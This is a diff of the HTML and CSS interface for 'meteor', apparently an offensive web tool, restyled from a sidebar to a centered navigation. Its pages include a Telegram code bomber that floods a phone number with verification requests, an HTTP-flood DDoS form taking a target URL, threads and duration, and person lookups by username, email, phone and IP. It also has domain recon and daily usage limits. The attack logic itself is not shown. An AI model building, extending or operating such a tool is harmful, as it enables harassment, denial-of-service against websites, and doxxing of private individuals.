@@ -5,9 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>meteor</title>
     <style>
-        /* ============================================================
-           ROOT VARIABLES & RESET
-           ============================================================ */
         * {
             margin: 0;
             padding: 0;
@@ -15,243 +12,203 @@
         }
 
         :root {
-            --bg-primary: #0a0a0f;
-            --bg-secondary: #12121a;
-            --bg-card: rgba(18, 18, 26, 0.85);
-            --bg-card-hover: rgba(30, 30, 42, 0.9);
-            --bg-input: #1a1a24;
-            --border-color: #2a2a3a;
+            --bg-primary: #0b0b12;
+            --bg-secondary: #13131e;
+            --bg-card: rgba(20, 20, 32, 0.8);
+            --bg-input: #1a1a2a;
+            --border-color: #2a2a42;
             --text-primary: #f0eeff;
-            --text-secondary: #a8a4c0;
-            --text-dim: #6a6a82;
-            --shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
-            --glow: rgba(160, 140, 255, 0.08);
+            --text-secondary: #a8a4c8;
+            --text-dim: #6a6a8a;
             --accent: #8b7aff;
-            --accent-glow: rgba(139, 122, 255, 0.2);
+            --accent-glow: rgba(139, 122, 255, 0.25);
+            --shadow: 0 8px 40px rgba(0, 0, 0, 0.6);
             --radius: 20px;
-            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition: 0.35s cubic-bezier(0.22, 1, 0.36, 1);
         }
 
-        /* ============================================================
-           LIGHT THEME
-           ============================================================ */
         [data-theme="light"] {
-            --bg-primary: #f5f5fa;
-            --bg-secondary: #eaeaef;
+            --bg-primary: #f0f0f8;
+            --bg-secondary: #e4e4ec;
             --bg-card: rgba(255, 255, 255, 0.85);
-            --bg-card-hover: rgba(255, 255, 255, 0.95);
-            --bg-input: #f0f0f5;
-            --border-color: #d0d0dd;
+            --bg-input: #ececf4;
+            --border-color: #d0d0e0;
             --text-primary: #1a1a2e;
             --text-secondary: #4a4a62;
             --text-dim: #8a8aa2;
-            --shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
-            --glow: rgba(139, 122, 255, 0.06);
+            --shadow: 0 8px 40px rgba(0, 0, 0, 0.08);
         }
 
-        /* ============================================================
-           BASE
-           ============================================================ */
         body {
             background: var(--bg-primary);
             color: var(--text-primary);
             font-family: 'Inter', -apple-system, 'Segoe UI', Roboto, sans-serif;
-            height: 100vh;
-            overflow: hidden;
-            display: flex;
-            transition: background var(--transition), color var(--transition);
-        }
-
-        /* ============================================================
-           SCROLLBAR
-           ============================================================ */
-        ::-webkit-scrollbar {
-            width: 4px;
-            height: 4px;
-        }
-        ::-webkit-scrollbar-track {
-            background: transparent;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: var(--text-dim);
-            border-radius: 10px;
-        }
-
-        /* ============================================================
-           SIDEBAR
-           ============================================================ */
-        .sidebar {
-            width: 220px;
-            min-width: 220px;
-            background: var(--bg-secondary);
-            border-right: 1px solid var(--border-color);
-            padding: 28px 0;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            transition: background var(--transition), color var(--transition);
+            overflow-x: hidden;
+        }
+
+        .bg-glow {
+            position: fixed;
+            top: -30%;
+            left: -20%;
+            width: 70%;
+            height: 70%;
+            background: radial-gradient(ellipse, rgba(139, 122, 255, 0.08), transparent 70%);
+            pointer-events: none;
+            z-index: 0;
+            animation: floatGlow 20s ease-in-out infinite alternate;
+        }
+        .bg-glow:nth-child(2) {
+            top: 40%;
+            right: -10%;
+            left: auto;
+            width: 50%;
+            height: 50%;
+            background: radial-gradient(ellipse, rgba(139, 122, 255, 0.05), transparent 70%);
+            animation-delay: -7s;
+        }
+        @keyframes floatGlow {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(60px, -40px) scale(1.2); }
+        }
+
+        #particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
             height: 100%;
-            user-select: none;
-            transition: background var(--transition), border-color var(--transition);
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            background: rgba(139, 122, 255, 0.15);
+            border-radius: 50%;
+            animation: floatParticle linear infinite;
+        }
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) translateX(0) scale(0); opacity: 0; }
+            10% { opacity: 1; transform: translateY(80vh) translateX(20px) scale(1); }
+            90% { opacity: 0.6; }
+            100% { transform: translateY(-20vh) translateX(-30px) scale(0.5); opacity: 0; }
+        }
+
+        .header {
             position: relative;
             z-index: 10;
-        }
-
-        .brand {
-            font-size: 1.8rem;
-            font-weight: 700;
             text-align: center;
-            padding: 0 10px 32px;
-            color: var(--text-primary);
-            letter-spacing: -0.5px;
-            transition: color var(--transition);
+            padding: 16px 0 24px;
+            width: 100%;
+            max-width: 900px;
+        }
+        .brand {
+            font-size: 2.8rem;
+            font-weight: 700;
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, var(--accent), #b8aaff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
         .brand span {
-            color: var(--accent);
+            background: none;
+            -webkit-text-fill-color: var(--text-dim);
         }
+        /* .subtitle убран */
 
-        .nav-item {
-            padding: 12px 24px;
-            margin: 3px 14px;
-            border-radius: 12px;
-            cursor: pointer;
-            transition: background var(--transition), color var(--transition);
-            font-weight: 500;
-            color: var(--text-secondary);
+        .nav-center {
+            position: relative;
+            z-index: 10;
             display: flex;
-            align-items: center;
-            gap: 14px;
-            font-size: 0.95rem;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+            padding: 8px;
+            background: var(--bg-secondary);
+            border-radius: 60px;
+            border: 1px solid var(--border-color);
+            max-width: 700px;
+            width: 100%;
+            margin: 0 auto 28px;
+            transition: background var(--transition), border-color var(--transition);
+            box-shadow: var(--shadow);
+        }
+        .nav-btn {
+            padding: 10px 22px;
+            border-radius: 40px;
+            border: none;
+            background: transparent;
+            color: var(--text-secondary);
+            font-weight: 600;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all var(--transition);
+            font-family: inherit;
+            letter-spacing: 0.3px;
             position: relative;
         }
-        .nav-item:hover {
-            background: var(--glow);
+        .nav-btn:hover {
             color: var(--text-primary);
+            background: rgba(139, 122, 255, 0.08);
         }
-        .nav-item.active {
-            background: var(--glow);
-            color: var(--accent);
-        }
-        .nav-item.active::before {
-            content: '';
-            position: absolute;
-            left: 0;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 3px;
-            height: 24px;
+        .nav-btn.active {
             background: var(--accent);
-            border-radius: 0 4px 4px 0;
+            color: #fff;
+            box-shadow: 0 4px 20px var(--accent-glow);
         }
-        .nav-item i {
-            font-size: 1.2rem;
-            width: 28px;
-            text-align: center;
+        .nav-btn i {
+            margin-right: 8px;
             font-style: normal;
         }
 
-        /* ============================================================
-           SIDEBAR FOOTER (device & time)
-           ============================================================ */
-        .sidebar-footer {
-            margin-top: auto;
-            padding: 16px 20px;
-            border-top: 1px solid var(--border-color);
-            transition: border-color var(--transition);
-        }
-        .device-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 0.75rem;
-            color: var(--text-dim);
-        }
-        .device-info .icon {
-            font-size: 1.2rem;
-        }
-        .device-info .time {
-            margin-left: auto;
-            font-weight: 500;
-            color: var(--text-secondary);
-        }
-
-        /* ============================================================
-           MAIN
-           ============================================================ */
         .main {
+            position: relative;
+            z-index: 10;
+            max-width: 1100px;
+            width: 100%;
             flex: 1;
-            padding: 28px 36px;
-            overflow-y: auto;
-            height: 100vh;
-            background: var(--bg-primary);
-            transition: background var(--transition);
         }
 
-        /* ============================================================
-           PAGES
-           ============================================================ */
         .page {
             display: none;
-            animation: fadeSlide 0.35s ease;
+            animation: fadeSlide 0.4s ease;
         }
         .page.active {
             display: block;
         }
 
         @keyframes fadeSlide {
-            from {
-                opacity: 0;
-                transform: translateY(12px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(16px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .page-title {
-            font-size: 1.6rem;
-            font-weight: 600;
-            margin-bottom: 28px;
-            color: var(--text-primary);
-            transition: color var(--transition);
-            letter-spacing: -0.3px;
-        }
-        .page-title i {
-            margin-right: 12px;
-        }
-
-        /* ============================================================
-           GRID
-           ============================================================ */
-        .grid-2 {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 24px;
-        }
-
-        /* ============================================================
-           CARDS (glassmorphism)
-           ============================================================ */
         .card {
             background: var(--bg-card);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
             border: 1px solid var(--border-color);
             border-radius: var(--radius);
-            padding: 22px 26px;
+            padding: 24px 28px;
             margin-bottom: 22px;
-            transition: background var(--transition), border-color var(--transition), box-shadow var(--transition), transform 0.2s ease;
+            transition: background var(--transition), border-color var(--transition), box-shadow var(--transition), transform 0.25s ease;
             box-shadow: var(--shadow);
         }
         .card:hover {
             border-color: var(--accent);
-            transform: translateY(-2px);
-            box-shadow: var(--shadow), 0 0 30px var(--accent-glow);
+            transform: translateY(-3px);
+            box-shadow: var(--shadow), 0 0 40px var(--accent-glow);
         }
-
         .card-title {
             font-size: 0.7rem;
             text-transform: uppercase;
-            letter-spacing: 1.2px;
+            letter-spacing: 1.5px;
             color: var(--text-dim);
             margin-bottom: 16px;
             border-bottom: 1px solid var(--border-color);
@@ -259,33 +216,27 @@
             transition: color var(--transition), border-color var(--transition);
         }
 
-        /* ============================================================
-           STATS
-           ============================================================ */
-        .stat-row {
-            display: flex;
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
             gap: 16px;
-            flex-wrap: wrap;
             margin-bottom: 24px;
         }
         .stat-box {
             background: var(--bg-card);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
-            border-radius: 16px;
-            padding: 16px 22px;
             border: 1px solid var(--border-color);
-            flex: 1;
-            min-width: 110px;
+            border-radius: 16px;
+            padding: 16px 20px;
+            text-align: center;
             transition: background var(--transition), border-color var(--transition);
         }
-        .stat-box .num {
+        .stat-num {
             font-size: 1.8rem;
             font-weight: 700;
             color: var(--text-primary);
             transition: color var(--transition);
         }
-        .stat-box .lbl {
+        .stat-label {
             font-size: 0.6rem;
             color: var(--text-dim);
             text-transform: uppercase;
@@ -293,9 +244,6 @@
             margin-top: 4px;
         }
 
-        /* ============================================================
-           PROGRESS
-           ============================================================ */
         .progress-bar {
             background: var(--bg-input);
             border-radius: 30px;
@@ -312,9 +260,17 @@
             border-radius: 30px;
         }
 
-        /* ============================================================
-           INPUTS
-           ============================================================ */
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 22px;
+        }
+        .grid-3 {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 22px;
+        }
+
         .input-group {
             margin-bottom: 16px;
         }
@@ -346,9 +302,6 @@
             box-shadow: 0 0 0 3px var(--accent-glow);
         }
 
-        /* ============================================================
-           BUTTONS
-           ============================================================ */
         .btn {
             background: var(--bg-input);
             border: 1px solid var(--border-color);
@@ -358,7 +311,7 @@
             font-weight: 600;
             color: var(--text-primary);
             cursor: pointer;
-            transition: background var(--transition), border-color var(--transition), color var(--transition), transform 0.15s ease;
+            transition: all var(--transition);
             font-family: inherit;
             font-size: 0.95rem;
             letter-spacing: 0.3px;
@@ -368,6 +321,7 @@
             border-color: var(--accent);
             color: #fff;
             transform: scale(0.98);
+            box-shadow: 0 4px 20px var(--accent-glow);
         }
         .btn-danger {
             background: rgba(239, 68, 68, 0.15);
@@ -379,10 +333,17 @@
             border-color: #ef4444;
             color: #fff;
         }
+        .btn-success {
+            background: rgba(34, 197, 94, 0.15);
+            border-color: rgba(34, 197, 94, 0.3);
+            color: #6ee7b7;
+        }
+        .btn-success:hover {
+            background: #22c55e;
+            border-color: #22c55e;
+            color: #fff;
+        }
 
-        /* ============================================================
-           LOG AREA
-           ============================================================ */
         .log-area {
             background: var(--bg-input);
             border-radius: 14px;
@@ -411,20 +372,6 @@
             color: var(--text-secondary);
         }
 
-        .recent {
-            background: var(--bg-input);
-            border-radius: 14px;
-            padding: 14px;
-            max-height: 150px;
-            overflow-y: auto;
-            font-size: 0.7rem;
-            border: 1px solid var(--border-color);
-            transition: background var(--transition), border-color var(--transition);
-        }
-
-        /* ============================================================
-           REPORT MODAL
-           ============================================================ */
         .report-modal {
             position: fixed;
             top: 0;
@@ -432,8 +379,8 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(8px);
-            -webkit-backdrop-filter: blur(8px);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
             z-index: 1000;
             display: none;
             align-items: center;
@@ -444,23 +391,17 @@
         .report-modal.active {
             display: flex;
         }
-
         @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
-
         .report-card {
             background: var(--bg-card);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             border: 1px solid var(--border-color);
             border-radius: 28px;
-            max-width: 720px;
+            max-width: 750px;
             width: 100%;
             max-height: 85vh;
             padding: 30px 34px;
@@ -469,18 +410,10 @@
             animation: slideUp 0.3s ease;
             transition: background var(--transition), border-color var(--transition);
         }
-
         @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-
         .report-card h2 {
             font-size: 1.4rem;
             font-weight: 600;
@@ -512,7 +445,7 @@
             color: var(--text-primary);
             font-weight: 600;
             cursor: pointer;
-            transition: background var(--transition), border-color var(--transition), color var(--transition);
+            transition: all var(--transition);
             flex: 1;
             min-width: 100px;
             font-family: inherit;
@@ -533,10 +466,7 @@
             color: #f87171;
         }
 
-        /* ============================================================
-           THEME TOGGLE (в настройках)
-           ============================================================ */
-        .theme-toggle-group {
+        .theme-group {
             display: flex;
             gap: 12px;
             flex-wrap: wrap;
@@ -549,7 +479,7 @@
             cursor: pointer;
             color: var(--text-secondary);
             font-weight: 500;
-            transition: background var(--transition), border-color var(--transition), color var(--transition);
+            transition: all var(--transition);
             font-family: inherit;
             font-size: 0.85rem;
         }
@@ -563,88 +493,102 @@
             color: #fff;
         }
 
-        /* ============================================================
-           RESPONSIVE
-           ============================================================ */
+        .setting-toggle {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            padding: 8px 0;
+        }
+        .toggle {
+            width: 44px;
+            height: 24px;
+            background: var(--bg-input);
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background var(--transition);
+            position: relative;
+            border: 1px solid var(--border-color);
+        }
+        .toggle.active {
+            background: var(--accent);
+            border-color: var(--accent);
+        }
+        .toggle::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 18px;
+            height: 18px;
+            background: #fff;
+            border-radius: 50%;
+            transition: transform var(--transition);
+        }
+        .toggle.active::after {
+            transform: translateX(20px);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px 0 10px;
+            font-size: 0.7rem;
+            color: var(--text-dim);
+            border-top: 1px solid var(--border-color);
+            margin-top: 20px;
+            transition: border-color var(--transition);
+        }
+
+        .settings-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
         @media (max-width: 860px) {
-            .grid-2 {
+            .settings-grid {
                 grid-template-columns: 1fr;
             }
-            .sidebar {
-                width: 70px;
-                min-width: 70px;
-                padding: 16px 0;
+            .grid-2,
+            .grid-3 {
+                grid-template-columns: 1fr;
+            }
+            .nav-center {
+                border-radius: 30px;
+                padding: 6px;
+                gap: 4px;
+            }
+            .nav-btn {
+                padding: 8px 14px;
+                font-size: 0.75rem;
             }
             .brand {
-                font-size: 0.9rem;
-                padding-bottom: 20px;
+                font-size: 2rem;
             }
-            .nav-item {
-                padding: 10px 12px;
-                margin: 3px 6px;
-                font-size: 0;
-                justify-content: center;
+            .header {
+                padding: 10px 0 16px;
             }
-            .nav-item i {
-                font-size: 1.3rem;
-                width: auto;
-            }
-            .nav-item.active::before {
-                display: none;
-            }
-            .sidebar-footer {
-                padding: 10px 8px;
-            }
-            .device-info {
-                font-size: 0;
-                justify-content: center;
-            }
-            .device-info .icon {
-                font-size: 1.2rem;
-            }
-            .device-info .time {
-                font-size: 0;
-                margin-left: 0;
-            }
-            .main {
-                padding: 16px;
-            }
-            .page-title {
-                font-size: 1.2rem;
-            }
-            .stat-box .num {
-                font-size: 1.4rem;
+            .card {
+                padding: 18px 20px;
             }
             .report-card {
                 padding: 20px;
             }
         }
-
         @media (max-width: 480px) {
-            .sidebar {
-                width: 56px;
-                min-width: 56px;
-                padding: 12px 0;
+            body {
+                padding: 10px;
             }
-            .nav-item {
-                padding: 8px 10px;
-                margin: 2px 4px;
+            .nav-btn {
+                padding: 6px 10px;
+                font-size: 0.65rem;
             }
-            .nav-item i {
-                font-size: 1rem;
+            .nav-btn i {
+                margin-right: 4px;
             }
-            .main {
-                padding: 12px;
+            .brand {
+                font-size: 1.6rem;
             }
-            .stat-row {
-                gap: 8px;
-            }
-            .stat-box {
-                padding: 10px 14px;
-                min-width: 60px;
-            }
-            .stat-box .num {
-                font-size: 1.1rem;
+            .stat-num {
+                font-size: 1.3rem;
             }
             .card {
                 padding: 14px 16px;
@@ -655,191 +599,181 @@
 </head>
 <body>
 
-    <!-- ============================================================
-    SIDEBAR
-    ============================================================ -->
-    <div class="sidebar" id="sidebar">
+    <div class="bg-glow"></div>
+    <div class="bg-glow"></div>
+    <div id="particles"></div>
+
+    <header class="header">
         <div class="brand">meteor<span>.</span></div>
+        <!-- subtitle удалён -->
+    </header>
 
-        <div class="nav-item active" data-page="home">
-            <i>⌂</i> <span>Home</span>
-        </div>
-        <div class="nav-item" data-page="spam">
-            <i>⚡</i> <span>Spam Kod</span>
-        </div>
-        <div class="nav-item" data-page="ddos">
-            <i>⊹</i> <span>DDoS</span>
-        </div>
-        <div class="nav-item" data-page="search">
-            <i>◈</i> <span>Search</span>
-        </div>
-        <div class="nav-item" data-page="settings">
-            <i>⚙</i> <span>Settings</span>
-        </div>
-        <div class="nav-item" data-page="logs">
-            <i>≡</i> <span>Log</span>
-        </div>
+    <nav class="nav-center" id="mainNav">
+        <button class="nav-btn active" data-page="home"><i>⌂</i> Home</button>
+        <button class="nav-btn" data-page="search"><i>◈</i> Search</button>
+        <button class="nav-btn" data-page="domain"><i>⊹</i> Domain</button>
+        <button class="nav-btn" data-page="spam"><i>⚡</i> Spam</button>
+        <button class="nav-btn" data-page="settings"><i>⚙</i> Settings</button>
+        <button class="nav-btn" data-page="logs"><i>≡</i> Logs</button>
+    </nav>
 
-        <div class="sidebar-footer">
-            <div class="device-info">
-                <span class="icon" id="deviceIcon">🖥</span>
-                <span id="deviceName">PC</span>
-                <span class="time" id="liveTime">00:00:00</span>
-            </div>
-        </div>
-    </div>
+    <main class="main">
 
-    <!-- ============================================================
-    MAIN
-    ============================================================ -->
-    <div class="main">
-
-        <!-- ========== HOME ========== -->
-        <div id="page-home" class="page active">
-            <div class="page-title"><i>⌂</i> Dashboard</div>
-            <div class="stat-row">
-                <div class="stat-box">
-                    <div class="num" id="reqTotal">0</div>
-                    <div class="lbl">Requests</div>
-                </div>
-                <div class="stat-box">
-                    <div class="num" id="uptime">00:00:00</div>
-                    <div class="lbl">Uptime</div>
-                </div>
-                <div class="stat-box">
-                    <div class="num" id="successRate">100%</div>
-                    <div class="lbl">Success</div>
-                </div>
+        <section id="page-home" class="page active">
+            <div class="stats-grid">
+                <div class="stat-box"><div class="stat-num" id="reqTotal">0</div><div class="stat-label">Requests</div></div>
+                <div class="stat-box"><div class="stat-num" id="uptime">00:00:00</div><div class="stat-label">Uptime</div></div>
+                <div class="stat-box"><div class="stat-num" id="successRate">100%</div><div class="stat-label">Success</div></div>
+                <div class="stat-box"><div class="stat-num" id="statusLed">🟢</div><div class="stat-label">Status</div></div>
             </div>
             <div class="card">
-                <div class="card-title">System Load</div>
-                <div class="progress-bar">
-                    <div class="progress-fill" id="coreFill" style="width:86%"></div>
-                </div>
+                <div class="card-title">System</div>
+                <div class="progress-bar"><div class="progress-fill" id="coreFill" style="width:86%"></div></div>
             </div>
             <div class="card">
                 <div class="card-title">Recent Activity</div>
-                <div class="recent" id="recentLog"></div>
+                <div class="log-area" id="recentLog" style="max-height:150px;"></div>
             </div>
-        </div>
+        </section>
 
-        <!-- ========== SPAM ========== -->
-        <div id="page-spam" class="page">
-            <div class="page-title"><i>⚡</i> Spam Kod</div>
+        <section id="page-search" class="page">
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-title">👤 Username (25+ sites)</div>
+                    <div class="input-group"><input type="text" id="searchUsername" placeholder="@username"></div>
+                    <button class="btn btn-success" id="searchUsernameBtn">▶ Search</button>
+                    <div class="log-area" id="searchUsernameLog" style="max-height:120px;"></div>
+                </div>
+                <div class="card">
+                    <div class="card-title">📧 Email (40+ sites)</div>
+                    <div class="input-group"><input type="email" id="searchEmail" placeholder="user@example.com"></div>
+                    <button class="btn btn-success" id="searchEmailBtn">▶ Search</button>
+                    <div class="log-area" id="searchEmailLog" style="max-height:120px;"></div>
+                </div>
+                <div class="card">
+                    <div class="card-title">📱 Phone Number</div>
+                    <div class="input-group"><input type="text" id="searchPhone" placeholder="+7 999 123 45 67"></div>
+                    <button class="btn btn-success" id="searchPhoneBtn">▶ Search</button>
+                    <div class="log-area" id="searchPhoneLog" style="max-height:120px;"></div>
+                </div>
+                <div class="card">
+                    <div class="card-title">🌐 IP Address</div>
+                    <div class="input-group"><input type="text" id="searchIp" placeholder="8.8.8.8"></div>
+                    <button class="btn btn-success" id="searchIpBtn">▶ Search</button>
+                    <div class="log-area" id="searchIpLog" style="max-height:120px;"></div>
+                </div>
+            </div>
+        </section>
+
+        <section id="page-domain" class="page">
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-title">🌐 Domain Recon (theHarvester)</div>
+                    <div class="input-group"><input type="text" id="domainTarget" placeholder="example.com"></div>
+                    <button class="btn btn-success" id="domainHarvestBtn">▶ Harvest</button>
+                    <div class="log-area" id="domainLog" style="max-height:150px;"></div>
+                </div>
+                <div class="card">
+                    <div class="card-title">🔍 Subdomain Discovery (Subfinder)</div>
+                    <div class="input-group"><input type="text" id="subfinderTarget" placeholder="example.com"></div>
+                    <button class="btn btn-success" id="subfinderBtn">▶ Find Subdomains</button>
+                    <div class="log-area" id="subfinderLog" style="max-height:150px;"></div>
+                </div>
+            </div>
+        </section>
+
+        <section id="page-spam" class="page">
             <div class="card">
-                <div class="card-title">Telegram Code Bomber</div>
-                <div class="input-group">
-                    <label>📞 Phone (with +)</label>
-                    <input type="tel" id="smsPhone" value="+7">
-                </div>
-                <div class="input-group">
-                    <label>🔄 Cycles (1 cycle = 5 requests)</label>
-                    <input type="number" id="smsCycles" value="3" min="1" max="30">
-                </div>
+                <div class="card-title">⚡ Telegram Code Bomber</div>
+                <div class="input-group"><label>📞 Phone (with +)</label><input type="tel" id="smsPhone" value="+7"></div>
+                <div class="input-group"><label>🔄 Cycles (1 cycle = 5 requests)</label><input type="number" id="smsCycles" value="3" min="1" max="30"></div>
                 <button class="btn" id="smsBtn">▶ Launch</button>
                 <div class="log-area" id="smsLog"></div>
             </div>
-        </div>
-
-        <!-- ========== DDOS ========== -->
-        <div id="page-ddos" class="page">
-            <div class="page-title"><i>⊹</i> DDoS Attack</div>
             <div class="card">
-                <div class="card-title">HTTP Flood</div>
-                <div class="input-group">
-                    <label>🎯 Target URL</label>
-                    <input type="text" id="ddosUrl" placeholder="https://example.com">
-                </div>
-                <div class="input-group">
-                    <label>⚡ Threads (1-200)</label>
-                    <input type="number" id="ddosThreads" value="60" min="1" max="200">
-                </div>
-                <div class="input-group">
-                    <label>⏱️ Duration (sec)</label>
-                    <input type="number" id="ddosDuration" value="30" min="5" max="300">
-                </div>
+                <div class="card-title">🌐 DDoS Attack</div>
+                <div class="input-group"><label>🎯 Target URL</label><input type="text" id="ddosUrl" placeholder="https://example.com"></div>
+                <div class="input-group"><label>⚡ Threads (1-200)</label><input type="number" id="ddosThreads" value="60" min="1" max="200"></div>
+                <div class="input-group"><label>⏱️ Duration (sec)</label><input type="number" id="ddosDuration" value="30" min="5" max="300"></div>
                 <button class="btn btn-danger" id="ddosBtn">▶ Launch</button>
                 <div class="progress-bar" id="ddosProgress" style="display:none; margin-top:12px;">
                     <div class="progress-fill" id="ddosFill"></div>
                 </div>
                 <div class="log-area" id="ddosLog"></div>
             </div>
-        </div>
+        </section>
 
-        <!-- ========== SEARCH ========== -->
-        <div id="page-search" class="page">
-            <div class="page-title"><i>◈</i> Search</div>
-            <div class="grid-2">
+        <section id="page-settings" class="page">
+            <div class="settings-grid">
                 <div class="card">
-                    <div class="card-title">📱 Phone Number</div>
+                    <div class="card-title">Appearance</div>
                     <div class="input-group">
-                        <input type="text" id="searchPhone" placeholder="+7 999 123 45 67">
+                        <label>🎨 Theme</label>
+                        <div class="theme-group">
+                            <div class="theme-btn active" data-theme="dark">🌙 Dark</div>
+                            <div class="theme-btn" data-theme="light">☀️ Light</div>
+                        </div>
                     </div>
-                    <button class="btn" id="searchPhoneBtn">▶ Search</button>
-                    <div class="log-area" id="searchPhoneLog" style="max-height:120px;"></div>
+                    <div class="input-group">
+                        <label>🔤 Font</label>
+                        <select id="fontSelect">
+                            <option>Inter</option>
+                            <option>Fira Code</option>
+                            <option>JetBrains Mono</option>
+                            <option>Consolas</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>🔊 Sound effects</label>
+                        <select id="soundSelect">
+                            <option value="on">On</option>
+                            <option value="off">Off</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>🎨 Particles count</label>
+                        <input type="range" id="particleRange" min="0" max="80" value="40">
+                        <span id="particleCountDisplay">40</span>
+                    </div>
+                    <div class="setting-toggle">
+                        <span style="color:var(--text-dim); font-size:0.8rem;">⚡ Eco mode</span>
+                        <div class="toggle" id="ecoToggle"></div>
+                    </div>
                 </div>
                 <div class="card">
-                    <div class="card-title">🌐 IP Address</div>
+                    <div class="card-title">System</div>
                     <div class="input-group">
-                        <input type="text" id="searchIp" placeholder="8.8.8.8">
+                        <label>🔄 Restart App</label>
+                        <button class="btn" id="restartBtn">⟳ Restart</button>
                     </div>
-                    <button class="btn" id="searchIpBtn">▶ Search</button>
-                    <div class="log-area" id="searchIpLog" style="max-height:120px;"></div>
+                    <div class="input-group">
+                        <label>🗑️ Reset all settings</label>
+                        <button class="btn btn-danger" id="resetBtn">⟲ Reset</button>
+                    </div>
+                    <div class="input-group">
+                        <label>👤 Developer</label>
+                        <button class="btn" id="devContactBtn">✉️ Перейти к ЛС разработчика</button>
+                    </div>
                 </div>
                 <div class="card">
-                    <div class="card-title">🔄 MNP (by phone)</div>
+                    <div class="card-title">Limits</div>
                     <div class="input-group">
-                        <input type="text" id="searchMnp" placeholder="+7 999 123 45 67">
+                        <label>💣 Spam Kod (daily)</label>
+                        <span id="spamLimitDisplay">5 / 5</span>
                     </div>
-                    <button class="btn" id="searchMnpBtn">▶ Search</button>
-                    <div class="log-area" id="searchMnpLog" style="max-height:120px;"></div>
-                </div>
-                <div class="card">
-                    <div class="card-title">🔎 Username (socials)</div>
                     <div class="input-group">
-                        <input type="text" id="searchUsername" placeholder="@username">
+                        <label>🌐 DDoS Attack (daily)</label>
+                        <span id="ddosLimitDisplay">3 / 3</span>
                     </div>
-                    <button class="btn" id="searchUsernameBtn">▶ Search</button>
-                    <div class="log-area" id="searchUsernameLog" style="max-height:120px;"></div>
+                    <div class="input-group">
+                        <label>📊 Search (daily)</label>
+                        <span id="searchLimitDisplay">10 / 10</span>
+                    </div>
                 </div>
             </div>
-        </div>
+        </section>
 
-        <!-- ========== SETTINGS ========== -->
-        <div id="page-settings" class="page">
-            <div class="page-title"><i>⚙</i> Settings</div>
-            <div class="card">
-                <div class="card-title">Appearance</div>
-                <div class="input-group">
-                    <label>🎨 Theme</label>
-                    <div class="theme-toggle-group">
-                        <div class="theme-btn active" data-theme="dark">🌙 Dark</div>
-                        <div class="theme-btn" data-theme="light">☀️ Light</div>
-                    </div>
-                </div>
-                <div class="input-group">
-                    <label>🔤 Font</label>
-                    <select id="fontSelect">
-                        <option>Inter</option>
-                        <option>Fira Code</option>
-                        <option>JetBrains Mono</option>
-                        <option>Consolas</option>
-                    </select>
-                </div>
-                <div class="input-group">
-                    <label>🔊 Sound effects</label>
-                    <select id="soundSelect">
-                        <option value="on">On</option>
-                        <option value="off">Off</option>
-                    </select>
-                </div>
-                <button class="btn btn-danger" id="resetBtn">⟲ Reset all settings</button>
-            </div>
-        </div>
-
-        <!-- ========== LOGS ========== -->
-        <div id="page-logs" class="page">
-            <div class="page-title"><i>≡</i> System Log</div>
+        <section id="page-logs" class="page">
             <div class="card">
                 <div class="log-area" id="globalLog" style="max-height:400px;"></div>
                 <div style="display:flex; gap:12px; margin-top:16px;">
@@ -847,13 +781,10 @@
                     <button class="btn" id="copyLogs" style="background:var(--bg-input);">⎘ Copy</button>
                 </div>
             </div>
-        </div>
+        </section>
 
-    </div>
+    </main>
 
-    <!-- ============================================================
-    REPORT MODAL
-    ============================================================ -->
     <div class="report-modal" id="reportModal">
         <div class="report-card">
             <h2 id="reportTitle">📄 Report</h2>
